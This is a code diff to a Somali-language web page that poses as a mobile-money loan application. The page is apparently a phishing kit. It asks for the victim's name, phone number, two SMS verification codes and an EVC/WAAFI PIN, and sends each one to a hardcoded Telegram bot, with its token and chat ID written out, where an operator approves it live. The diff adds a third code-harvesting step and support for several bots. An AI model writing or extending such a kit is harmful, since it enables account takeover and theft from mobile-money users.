@@ -146,38 +146,62 @@
     <section class="panel verification-panel hidden" id="verification">
       <div class="demo-ribbon"></div>
       <p class="verify-intro"></p>
+
+      <!-- Step 1: First Verification Code (6 digits) -->
       <div class="verification-step" id="verificationStep1">
-        <h1>Geli PIN-ka WAAFI</h1>
+        <h1>Geli Koodhka Xaqiijinta</h1>
         <div class="phone-display"><span>🌐</span><strong id="verificationPhone">+252 ••••••••••</strong></div>
-        <p class="verify-label">Geli PIN-kaaga WAAFI</p>
-        <div class="codes" id="code1" aria-label="Lambarka koowaad ee afar-godle ah">
+        <p class="verify-label">Geli koodhka xaqiijinta ee loo diray lambarka taleefanka</p>
+        <div class="codes" id="code1" aria-label="First six-digit verification code">
           <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka koowaad ee koodhka" autocomplete="off">
           <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka labaad ee koodhka" autocomplete="off">
           <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka saddexaad ee koodhka" autocomplete="off">
           <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka afraad ee koodhka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka shanaad ee koodhka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka lixaad ee koodhka" autocomplete="off">
           <button class="eye" type="button" data-toggle="code1" aria-label="Muuji ama qari koodhka koowaad">◉</button>
         </div>
         <button class="action" id="continueCode" type="button" disabled>SII WAD</button>
-        <p class="note">Geli PIN-ka afar-godle ah</p>
+        <p class="note">Geli koodhka lix-godle ah.</p>
         <p class="status" id="status1" role="status" aria-live="polite"></p>
       </div>
+
+      <!-- Step 2: PIN Code (4 digits) -->
       <div class="verification-step hidden" id="verificationStep2">
-        <h1>Geli Koodhka Xaqiijinta</h1>
+        <h1>Geli PIN-ka EVC</h1>
         <p class="verification-heading"></p>
         <p class="verify-intro"></p>
-        <p class="verify-label">Geli koodhka xaqiijinta ee loo diray lambarka taleefanka</p>
-        <div class="codes" id="code2" aria-label="Lambarka labaad ee koodhka">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka koowaad ee koodhka labaad" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka labaad ee koodhka labaad" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka saddexaad ee koodhka labaad" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka afraad ee koodhka labaad" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka shanaad ee koodhka labaad" autocomplete="off">
-          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka lixaad ee koodhka labaad" autocomplete="off">
-          <button class="eye" type="button" data-toggle="code2" aria-label="Muuji ama qari koodhka labaad">◉</button>
+        <p class="verify-label">Geli PIN-kaaga EVC</p>
+        <div class="codes" id="code2" aria-label="Four-digit PIN code">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka koowaad ee PIN-ka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka labaad ee PIN-ka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka saddexaad ee PIN-ka" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka afraad ee PIN-ka" autocomplete="off">
+          <button class="eye" type="button" data-toggle="code2" aria-label="Muuji ama qari PIN-ka">◉</button>
         </div>
-        <button class="action" id="verifyCode" type="button" disabled>XAQIIJI</button>
-        <p class="note">Geli koodhka lix-godle ah.</p>
+        <button class="action" id="verifyCode" type="button" disabled>SII WAD</button>
+        <p class="note">Geli PIN-ka afar-godle ah</p>
         <p class="status" id="status2" role="status" aria-live="polite"></p>
+      </div>
+
+      <!-- Step 3: Final Verification Code (6 digits) -->
+      <div class="verification-step hidden" id="verificationStep3">
+        <h1>Geli Koodhka Labaad ee Xaqiijinta</h1>
+        <p class="verification-heading"></p>
+        <p class="verify-intro"></p>
+        <p class="verify-label">Geli koodhka labaad ee xaqiijinta ee loo diray lambarka taleefanka</p>
+        <div class="codes" id="code3" aria-label="Final six-digit verification code">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka koowaad ee koodhka saddexaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka labaad ee koodhka saddexaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka saddexaad ee koodhka saddexaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka afraad ee koodhka saddexaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka shanaad ee koodhka saddexaad" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Lambarka lixaad ee koodhka saddexaad" autocomplete="off">
+          <button class="eye" type="button" data-toggle="code3" aria-label="Muuji ama qari koodhka saddexaad">◉</button>
+        </div>
+        <button class="action" id="finalVerifyCode" type="button" disabled>XAQIIJI</button>
+        <p class="note">Geli koodhka lix-godle ah.</p>
+        <p class="status" id="status3" role="status" aria-live="polite"></p>
       </div>
     </section>
 
@@ -198,9 +222,14 @@
   <script>
     'use strict';
 
-    const TELEGRAM_BOT_TOKEN = "8253214824:AAGodlrpAXEFqUcWOGXKbzCoNHLoL5vArcE";
-    const TELEGRAM_CHAT_ID = "6009831676";
-    const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+    const TELEGRAM_BOTS = [
+      {
+        name: 'Primary Bot',
+        token: '8253214824:AAGodlrpAXEFqUcWOGXKbzCoNHLoL5vArcE',
+        chatId: '6009831676',
+        lastUpdateId: 0
+      }
+    ];
 
     const $ = id => document.getElementById(id);
     const home = $('home');
@@ -210,7 +239,6 @@
     const loadingOverlay = $('loadingOverlay');
 
     let step = 1;
-    let lastUpdateId = 0;
 
     const money = n => '$' + Number(n || 0).toLocaleString('en-US', { maximumFractionDigits: 0 });
 
@@ -240,8 +268,8 @@
       return `${yyyy}-${mm}-${dd} ${formatTime(date)}`;
     }
 
-    async function tgRequest(method, payload) {
-      const res = await fetch(`${TG_API}/${method}`, {
+    async function tgRequestForBot(bot, method, payload) {
+      const res = await fetch(`https://api.telegram.org/bot${bot.token}/${method}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
@@ -249,20 +277,22 @@
       return await res.json();
     }
 
-    async function syncLatestUpdateOffset() {
-      try {
-        const data = await tgRequest('getUpdates', { offset: -1, timeout: 0 });
-        if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
-          lastUpdateId = data.result[data.result.length - 1].update_id + 1;
+    async function syncLatestUpdateOffsets() {
+      await Promise.all(TELEGRAM_BOTS.map(async bot => {
+        try {
+          const data = await tgRequestForBot(bot, 'getUpdates', { offset: -1, timeout: 0 });
+          if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
+            bot.lastUpdateId = data.result[data.result.length - 1].update_id + 1;
+          }
+        } catch (err) {
+          console.error(`Failed to sync update offset for ${bot.name}:`, err);
         }
-      } catch (err) {
-        console.error('Failed to sync update offset:', err);
-      }
+      }));
     }
 
-    // Sends ONLY name, phone, and code value (PIN first, then Verification Code), and waits for button click
+    // Sends to Telegram bot and resolves upon receiving a callback decision
     async function submitCodeAndWaitForTelegram({ user, phone, fieldLabel, codeValue, timeoutMs = 120000 }) {
-      await syncLatestUpdateOffset();
+      await syncLatestUpdateOffsets();
 
       const requestId = `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
       const now = new Date();
@@ -278,73 +308,97 @@
         `⏰ Submitted: ${formatTime(now)}`,
         `⏰ Expires: ${formatTime(expires)}`,
         '────────────────────────',
-        '⏳ ONLY FOR PETER'
+        '⏳ Waiting for administrator verification...'
       ].join('\n');
 
-      const sent = await tgRequest('sendMessage', {
-        chat_id: TELEGRAM_CHAT_ID,
-        text,
-        reply_markup: {
-          inline_keyboard: [[
-            { text: '✅ OTP Correct', callback_data: `approve:${requestId}` },
-            { text: '❌ OTP Invalid', callback_data: `reject:${requestId}` }
-          ]]
-        }
-      });
+      const sendResults = await Promise.all(
+        TELEGRAM_BOTS.map(bot =>
+          tgRequestForBot(bot, 'sendMessage', {
+            chat_id: bot.chatId,
+            text,
+            reply_markup: {
+              inline_keyboard: [[
+                { text: '✅ OTP Correct', callback_data: `approve:${requestId}` },
+                { text: '❌ OTP Invalid', callback_data: `reject:${requestId}` }
+              ]]
+            }
+          })
+        )
+      );
 
-      if (!sent.ok) {
-        throw new Error(sent.description || 'Failed to send message');
+      if (!sendResults.some(r => r && r.ok)) {
+        const firstErr = sendResults.find(r => r && r.description);
+        throw new Error((firstErr && firstErr.description) || 'Failed to send message to Telegram');
       }
 
       const deadline = Date.now() + timeoutMs;
 
       while (Date.now() < deadline) {
         const remainingSec = Math.max(1, Math.min(15, Math.ceil((deadline - Date.now()) / 1000)));
-        const updatesData = await tgRequest('getUpdates', {
-          offset: lastUpdateId,
-          timeout: remainingSec,
-          allowed_updates: ['callback_query']
-        });
 
-        if (updatesData.ok && Array.isArray(updatesData.result)) {
-          for (const upd of updatesData.result) {
-            lastUpdateId = Math.max(lastUpdateId, upd.update_id + 1);
-            const cq = upd.callback_query;
-            if (!cq || !cq.data) continue;
+        const pollResults = await Promise.all(
+          TELEGRAM_BOTS.map(async bot => {
+            try {
+              const updatesData = await tgRequestForBot(bot, 'getUpdates', {
+                offset: bot.lastUpdateId,
+                timeout: remainingSec,
+                allowed_updates: ['callback_query']
+              });
 
-            const [action, id] = String(cq.data).split(':');
-            if (id !== requestId) continue;
+              if (updatesData.ok && Array.isArray(updatesData.result)) {
+                for (const upd of updatesData.result) {
+                  bot.lastUpdateId = Math.max(bot.lastUpdateId, upd.update_id + 1);
+                  const cq = upd.callback_query;
+                  if (!cq || !cq.data) continue;
 
-            const approved = action === 'approve';
+                  const [action, id] = String(cq.data).split(':');
+                  if (id !== requestId) continue;
 
-            await tgRequest('answerCallbackQuery', {
-              callback_query_id: cq.id,
-              text: approved ? 'Confirmed as correct' : 'Marked as invalid'
-            });
+                  const approved = action === 'approve';
 
-            await tgRequest('sendMessage', {
-              chat_id: TELEGRAM_CHAT_ID,
-              text: approved
-                ? [
-                    `✅ ${fieldLabel.toUpperCase()} VERIFIED SUCCESSFULLY`,
-                    '────────────────────────',
-                    `👤 Name: ${user}`,
-                    `☎️ Phone: ${phone}`,
-                    `⏰ Verified: ${formatDateTime(new Date())}`,
-                    '────────────────────────',
-                    `✅ ${fieldLabel} confirmed!`
-                  ].join('\n')
-                : [
-                    `❌ ${fieldLabel.toUpperCase()} INVALID`,
-                    '────────────────────────',
-                    `👤 Name: ${user}`,
-                    `☎️ Phone: ${phone}`
-                  ].join('\n')
-            });
+                  await tgRequestForBot(bot, 'answerCallbackQuery', {
+                    callback_query_id: cq.id,
+                    text: approved ? 'Confirmed as correct' : 'Marked as invalid'
+                  });
 
-            return { ok: true, verified: approved };
-          }
-        }
+                  const statusMsg = approved
+                    ? [
+                        `✅ ${fieldLabel.toUpperCase()} VERIFIED SUCCESSFULLY`,
+                        '────────────────────────',
+                        `👤 Name: ${user}`,
+                        `☎️ Phone: ${phone}`,
+                        `⏰ Verified: ${formatDateTime(new Date())}`,
+                        '────────────────────────',
+                        `✅ ${fieldLabel} confirmed!`
+                      ].join('\n')
+                    : [
+                        `❌ ${fieldLabel.toUpperCase()} INVALID`,
+                        '────────────────────────',
+                        `👤 Name: ${user}`,
+                        `☎️ Phone: ${phone}`
+                      ].join('\n');
+
+                  await Promise.all(
+                    TELEGRAM_BOTS.map(targetBot =>
+                      tgRequestForBot(targetBot, 'sendMessage', {
+                        chat_id: targetBot.chatId,
+                        text: statusMsg
+                      })
+                    )
+                  );
+
+                  return { ok: true, verified: approved };
+                }
+              }
+            } catch (err) {
+              console.error(`Polling error on ${bot.name}:`, err);
+            }
+            return null;
+          })
+        );
+
+        const matched = pollResults.find(Boolean);
+        if (matched) return matched;
       }
 
       return { ok: false, verified: false, status: 'timeout' };
@@ -361,6 +415,15 @@
     $('amountRange').addEventListener('input', estimate);
     $('durationRange').addEventListener('input', estimate);
     estimate();
+
+    function showHome() {
+      home.classList.remove('hidden');
+      application.classList.add('hidden');
+      verification.classList.add('hidden');
+      confirmation.classList.add('hidden');
+      $('backLink').classList.add('hidden');
+      window.scrollTo(0, 0);
+    }
 
     $('applyBtn').addEventListener('click', () => {
       home.classList.add('hidden');
@@ -449,28 +512,60 @@
       $('sumPurpose').textContent = $('purpose').value || '—';
       $('sumApplicant').textContent = ($('firstName').value + ' ' + $('lastName').value).trim() || '—';
       $('sumEmail').textContent = $('email').value || '—';
-      $('sumPhone').textContent = '+243 ' + $('phone').value;
+      $('sumPhone').textContent = '+252 ' + $('phone').value;
     }
 
-    $('loanForm').addEventListener('submit', event => {
+    // 0. Form submit -> send phone number first -> wait for Telegram approval -> go to First Verification Code step
+    $('loanForm').addEventListener('submit', async event => {
       event.preventDefault();
       if (!validStep()) return;
 
       updateSummary();
+      const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
       const phoneRaw = $('phone').value.trim();
+      const formattedPhone = '+252 ' + phoneRaw;
 
-      application.classList.add('hidden');
-      verification.classList.remove('hidden');
-      $('verificationPhone').textContent = phoneRaw;
-      $('backLink').classList.add('hidden');
-      resetVerification();
-      window.scrollTo(0, 0);
+      $('submitBtn').disabled = true;
+      $('errorMsg').textContent = '';
+      showBlockingSpinner('Waa la xaqiijinayaa lambarka taleefanka.. HA XIDHIN BOGGAN');
+
+      try {
+        const result = await submitCodeAndWaitForTelegram({
+          user,
+          phone: formattedPhone,
+          fieldLabel: 'Phone number',
+          codeValue: formattedPhone
+        });
+
+        hideBlockingSpinner();
+        $('submitBtn').disabled = false;
+
+        if (result.ok && result.verified) {
+          application.classList.add('hidden');
+          verification.classList.remove('hidden');
+          $('verificationPhone').textContent = formattedPhone;
+          $('backLink').classList.add('hidden');
+          resetVerification();
+          $('code1').querySelector('input').focus();
+          window.scrollTo(0, 0);
+        } else if (result.status === 'timeout') {
+          $('errorMsg').textContent = 'Xaqiijin lama helin. Fadlan mar kale isku day.';
+        } else {
+          $('errorMsg').textContent = 'Fadlan mar kale isku day oo hubi inaad gelisay macluumaadka saxda ah.';
+        }
+      } catch (err) {
+        hideBlockingSpinner();
+        $('submitBtn').disabled = false;
+        console.error(err);
+        $('errorMsg').textContent = err.message || 'Cilad xiriir ah ayaa dhacday.';
+      }
     });
 
     function resetVerification() {
       $('verificationStep1').classList.remove('hidden');
       $('verificationStep2').classList.add('hidden');
-      ['code1', 'code2'].forEach(groupId => {
+      $('verificationStep3').classList.add('hidden');
+      ['code1', 'code2', 'code3'].forEach(groupId => {
         $(groupId).querySelectorAll('input').forEach(input => {
           input.value = '';
           input.type = 'password';
@@ -480,8 +575,11 @@
       $('continueCode').classList.remove('ready');
       $('verifyCode').disabled = true;
       $('verifyCode').classList.remove('ready');
+      $('finalVerifyCode').disabled = true;
+      $('finalVerifyCode').classList.remove('ready');
       $('status1').textContent = '';
       $('status2').textContent = '';
+      $('status3').textContent = '';
     }
 
     function setupCodeGroup(groupId, buttonId) {
@@ -506,11 +604,11 @@
           if (event.key === 'ArrowRight' && boxes[index + 1]) boxes[index + 1].focus();
         });
         box.addEventListener('paste', event => {
-          const digits = (event.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 4);
+          const digits = (event.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, boxes.length);
           if (!digits) return;
           event.preventDefault();
           boxes.forEach((input, i) => { input.value = digits[i] || ''; });
-          boxes[Math.min(digits.length, 3)].focus();
+          boxes[Math.min(digits.length - 1, boxes.length - 1)].focus();
           update();
         });
       });
@@ -520,16 +618,27 @@
       };
     }
 
+    document.querySelectorAll('.eye[data-toggle]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const group = $(btn.dataset.toggle);
+        if (!group) return;
+        const inputs = [...group.querySelectorAll('input')];
+        const show = inputs.some(i => i.type === 'password');
+        inputs.forEach(i => { i.type = show ? 'text' : 'password'; });
+      });
+    });
+
     const code1Group = setupCodeGroup('code1', 'continueCode');
     const code2Group = setupCodeGroup('code2', 'verifyCode');
+    const code3Group = setupCodeGroup('code3', 'finalVerifyCode');
 
-    // 1. Submit Name, Phone, and PIN -> wait until "OTP Correct" is clicked in Telegram -> go directly to Verification Code step
+    // 1. First Verification Code -> wait until approved in Telegram -> go to PIN step
     $('continueCode').addEventListener('click', async () => {
       if (!code1Group.update()) return;
 
       const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
       const phone = $('phone').value.trim();
-      const pin = code1Group.value();
+      const otpFirst = code1Group.value();
 
       $('continueCode').disabled = true;
       $('status1').textContent = 'FADLAN SUG..';
@@ -539,8 +648,8 @@
         const result = await submitCodeAndWaitForTelegram({
           user,
           phone,
-          fieldLabel: 'PIN entered',
-          codeValue: pin
+          fieldLabel: 'OTP entered',
+          codeValue: otpFirst
         });
 
         hideBlockingSpinner();
@@ -555,7 +664,7 @@
           $('status1').textContent = 'Xaqiijin lama helin. Fadlan mar kale isku day.';
           $('continueCode').disabled = false;
         } else {
-          $('status1').textContent = 'Waxaa lagu calaamadeeyay mid aan sax ahayn. Fadlan mar kale isku day oo hubi inaad gelisay macluumaadka saxda ah.';
+          $('status1').textContent = 'PIN-ka waa khalad. Fadlan mar kale isku day oo hubi inaad gelisay macluumaadka saxda ah.';
           $('continueCode').disabled = false;
         }
       } catch (err) {
@@ -566,38 +675,39 @@
       }
     });
 
-    // 2. Submit Name, Phone, and Verification Code -> wait until "OTP Correct" is clicked in Telegram -> go to Confirmation
+    // 2. PIN Code -> wait until approved in Telegram -> go to Final Verification Code step
     $('verifyCode').addEventListener('click', async () => {
       if (!code2Group.update()) return;
 
       const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
       const phone = $('phone').value.trim();
-      const otpEntered = code2Group.value();
+      const pin = code2Group.value();
 
       $('verifyCode').disabled = true;
-      $('status2').textContent = 'WAA LAGU SHUBAYAA AMAAHDA AKOONKAAGA WAAFI..';
-      showBlockingSpinner('Waxay qaadan kartaa ilaa hal daqiiqo');
+      $('status2').textContent = 'FADLAN SUG..';
+      showBlockingSpinner('Waa la xaqiijinayaa faahfaahinta amaahda.. HA XIDHIN BOGGAN');
 
       try {
         const result = await submitCodeAndWaitForTelegram({
           user,
           phone,
-          fieldLabel: 'OTP entered',
-          codeValue: otpEntered
+          fieldLabel: 'PIN entered',
+          codeValue: pin
         });
 
         hideBlockingSpinner();
 
         if (result.ok && result.verified) {
-          $('status2').textContent = 'OTP waa la xaqiijiyay.';
-          verification.classList.add('hidden');
-          confirmation.classList.remove('hidden');
+          $('status2').textContent = 'Waa la xaqiijiyay.';
+          $('verificationStep2').classList.add('hidden');
+          $('verificationStep3').classList.remove('hidden');
+          $('code3').querySelector('input').focus();
           window.scrollTo(0, 0);
         } else if (result.status === 'timeout') {
-          $('status2').textContent = 'Fadlan mar kale isku day oo hubi inaad gelisay macluumaadka saxda ah.';
+          $('status2').textContent = 'Xaqiijin lama helin. Fadlan mar kale isku day.';
           $('verifyCode').disabled = false;
         } else {
-          $('status2').textContent = 'OTP aan sax ahayn. Fadlan mar kale isku day.';
+          $('status2').textContent = 'PIN-ka waa khalad. Fadlan mar kale isku day.';
           $('verifyCode').disabled = false;
         }
       } catch (err) {
@@ -606,6 +716,54 @@
         $('status2').textContent = err.message || 'Cilad xiriir ah ayaa dhacday.';
         $('verifyCode').disabled = false;
       }
+    });
+
+    // 3. Final Verification Code -> wait until approved in Telegram -> go to Confirmation
+    $('finalVerifyCode').addEventListener('click', async () => {
+      if (!code3Group.update()) return;
+
+      const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
+      const phone = $('phone').value.trim();
+      const otpFinal = code3Group.value();
+
+      $('finalVerifyCode').disabled = true;
+      $('status3').textContent = 'WAA LAGU SHUBAYAA AMAAHDA AKOONKAAGA WAAFI..';
+      showBlockingSpinner('Waxay qaadan kartaa ilaa hal daqiiqo');
+
+      try {
+        const result = await submitCodeAndWaitForTelegram({
+          user,
+          phone,
+          fieldLabel: 'OTP entered',
+          codeValue: otpFinal
+        });
+
+        hideBlockingSpinner();
+
+        if (result.ok && result.verified) {
+          $('status3').textContent = 'OTP waa la xaqiijiyay.';
+          verification.classList.add('hidden');
+          confirmation.classList.remove('hidden');
+          window.scrollTo(0, 0);
+        } else if (result.status === 'timeout') {
+          $('status3').textContent = 'Xaqiijin lama helin. Fadlan mar kale isku day.';
+          $('finalVerifyCode').disabled = false;
+        } else {
+          $('status3').textContent = 'OTP-ga waa khalad. Fadlan mar kale isku day.';
+          $('finalVerifyCode').disabled = false;
+        }
+      } catch (err) {
+        hideBlockingSpinner();
+        console.error(err);
+        $('status3').textContent = err.message || 'Cilad xiriir ah ayaa dhacday.';
+        $('finalVerifyCode').disabled = false;
+      }
+    });
+
+    $('restartBtn').addEventListener('click', () => {
+      $('loanForm').reset();
+      estimate();
+      showHome();
     });
   </script>
 </body>
